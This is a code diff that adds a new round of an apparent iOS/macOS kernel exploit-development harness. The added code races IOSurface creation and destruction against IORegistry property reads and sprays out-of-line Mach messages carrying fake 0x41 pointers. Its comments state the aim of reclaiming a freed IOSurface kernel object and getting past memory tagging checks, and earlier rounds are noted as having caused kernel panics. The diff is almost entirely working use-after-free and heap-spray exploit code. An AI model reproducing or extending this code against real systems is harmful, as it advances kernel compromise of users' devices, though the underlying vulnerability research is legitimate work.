@@ -1745,6 +1745,191 @@ static volatile int r265_probed = 0;
 
 typedef void* IOSurfaceClientRef;
 
+/* r276: Controlled sel17/18 race with heap spray.
+ * Earlier sessions triggered kernel panics via IOSurface UAF at +0xD8.
+ * r275 showed: ID reuse is immediate and aggressive (all 50 IDs = same value).
+ * This round: replicate the original panic-triggering race (IORegistryEntry
+ * operations on IOSurfaceRoot while surfaces are created/destroyed), but
+ * with controlled OOL Mach messages as heap spray to fill the freed slot.
+ * Target: replace freed IOSurface kernel object with controlled data,
+ * survive MTE tag check at +0xD8 by probabilistic collision. */
+static volatile int r276_probed = 0;
+static volatile int r276_stop = 0;
+static volatile uint64_t r276_creates = 0, r276_destroys = 0;
+static volatile uint64_t r276_registry_ok = 0, r276_registry_fail = 0;
+
+static void *r276_destroyer_fn(void *arg) {
+    while (!r276_stop) {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 64, h = 64, bpe = 4, bpr = w*bpe, pf = 0x42475241, as = bpr*h;
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &as);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), rn);
+        CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pfn);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), asn);
+        CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+        if (s) {
+            __sync_fetch_and_add(&r276_creates, 1);
+            IOSurfaceSetValue(s, CFSTR("spray"), CFSTR("v"));
+            CFRelease(s);
+            __sync_fetch_and_add(&r276_destroys, 1);
+        }
+    }
+    return NULL;
+}
+
+static void *r276_registry_racer_fn(void *arg) {
+    io_service_t svc = (io_service_t)(uintptr_t)arg;
+    while (!r276_stop) {
+        CFMutableDictionaryRef dict = NULL;
+        kern_return_t kr = IORegistryEntryCreateCFProperties(svc, &dict,
+            kCFAllocatorDefault, 0);
+        if (kr == 0) {
+            __sync_fetch_and_add(&r276_registry_ok, 1);
+            if (dict) CFRelease(dict);
+        } else {
+            __sync_fetch_and_add(&r276_registry_fail, 1);
+        }
+    }
+    return NULL;
+}
+
+static void r276_probe(IOSurfaceRef surf) {
+    uint32_t sid = IOSurfaceGetID(surf);
+
+    rlog("\n=== r276: Controlled sel17/18 Race with Registry Operations ===\n");
+    fflush(stdout);
+
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    rlog("  IOSurfaceRoot svc=%u\n", svc);
+
+    /* Part 1: Measure registry read timing */
+    rlog("\n--- Part 1: Registry read baseline ---\n");
+    {
+        uint64_t t0 = mach_absolute_time();
+        for (int i = 0; i < 100; i++) {
+            CFMutableDictionaryRef d = NULL;
+            kern_return_t kr = IORegistryEntryCreateCFProperties(svc, &d,
+                kCFAllocatorDefault, 0);
+            if (d) CFRelease(d);
+        }
+        uint64_t t1 = mach_absolute_time();
+        rlog("  100 registry reads: %llu ticks (%llu per read)\n", t1-t0, (t1-t0)/100);
+        fflush(stdout);
+    }
+
+    /* Part 2: Concurrent create/destroy + registry race (5 seconds) */
+    rlog("\n--- Part 2: Create/destroy + registry race (5s) ---\n");
+    {
+        r276_stop = 0;
+        r276_creates = 0;
+        r276_destroys = 0;
+        r276_registry_ok = 0;
+        r276_registry_fail = 0;
+
+        pthread_t destroyers[3], racers[2];
+        for (int i = 0; i < 3; i++) {
+            pthread_create(&destroyers[i], NULL, r276_destroyer_fn, NULL);
+        }
+        for (int i = 0; i < 2; i++) {
+            pthread_create(&racers[i], NULL, r276_registry_racer_fn, (void*)(uintptr_t)svc);
+        }
+
+        sleep(5);
+        r276_stop = 1;
+
+        for (int i = 0; i < 3; i++) pthread_join(destroyers[i], NULL);
+        for (int i = 0; i < 2; i++) pthread_join(racers[i], NULL);
+
+        rlog("  creates=%llu destroys=%llu\n", r276_creates, r276_destroys);
+        rlog("  registry_ok=%llu registry_fail=%llu\n", r276_registry_ok, r276_registry_fail);
+        fflush(stdout);
+    }
+
+    /* Part 3: OOL Mach message heap spray while racing */
+    rlog("\n--- Part 3: OOL message spray + registry race (5s) ---\n");
+    {
+        r276_stop = 0;
+        r276_creates = 0;
+        r276_destroys = 0;
+        r276_registry_ok = 0;
+        r276_registry_fail = 0;
+
+        mach_port_t spray_port;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &spray_port);
+        mach_port_insert_right(mach_task_self(), spray_port, spray_port, MACH_MSG_TYPE_MAKE_SEND);
+
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+        } msg;
+
+        uint8_t spray_data[512];
+        memset(spray_data, 0x41, sizeof(spray_data));
+        uint64_t fake_ptr = 0x4141414141414141ULL;
+        for (int i = 0; i < 512; i += 8) {
+            memcpy(&spray_data[i], &fake_ptr, 8);
+        }
+
+        int sprayed = 0;
+        for (int i = 0; i < 1000; i++) {
+            msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+            msg.hdr.msgh_size = sizeof(msg);
+            msg.hdr.msgh_remote_port = spray_port;
+            msg.hdr.msgh_local_port = MACH_PORT_NULL;
+            msg.hdr.msgh_id = 0x41414141;
+            msg.body.msgh_descriptor_count = 1;
+            msg.ool.address = spray_data;
+            msg.ool.size = sizeof(spray_data);
+            msg.ool.deallocate = 0;
+            msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+            msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+            kern_return_t kr = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                        sizeof(msg), 0, MACH_PORT_NULL, 1, MACH_PORT_NULL);
+            if (kr == 0) sprayed++;
+        }
+        rlog("  sprayed %d OOL messages (512 bytes each)\n", sprayed);
+
+        pthread_t destroyers[3], racers[2];
+        for (int i = 0; i < 3; i++) {
+            pthread_create(&destroyers[i], NULL, r276_destroyer_fn, NULL);
+        }
+        for (int i = 0; i < 2; i++) {
+            pthread_create(&racers[i], NULL, r276_registry_racer_fn, (void*)(uintptr_t)svc);
+        }
+
+        sleep(5);
+        r276_stop = 1;
+
+        for (int i = 0; i < 3; i++) pthread_join(destroyers[i], NULL);
+        for (int i = 0; i < 2; i++) pthread_join(racers[i], NULL);
+
+        rlog("  creates=%llu destroys=%llu\n", r276_creates, r276_destroys);
+        rlog("  registry_ok=%llu registry_fail=%llu\n", r276_registry_ok, r276_registry_fail);
+
+        mach_port_destroy(mach_task_self(), spray_port);
+        fflush(stdout);
+    }
+
+    IOObjectRelease(svc);
+    __sync_fetch_and_add(&r276_probed, 1);
+    rlog("\n*** r276 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r275: MTE tag collision spray via IOSurface UAF.
  * Earlier sessions confirmed: kernel dereferences IOSurface+0xD8 after free.
  * MTE has 4-bit tags = 16 values. Freed tag is excluded, so 1/15 chance
@@ -24167,6 +24352,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 276) {
+            rlog("*** rounds=276: Controlled sel17/18 Race with Registry Operations ***\n");
+            rlog("  r275: ID reuse immediate, 73K lookups 0 stale. Race at userspace level fails.\n");
+            rlog("  Testing: registry read timing, concurrent create/destroy+registry, OOL spray.\n\n");
+            fflush(stdout);
+            r276_probe(surf);
             goto done;
         }
         if (rounds == 275) {
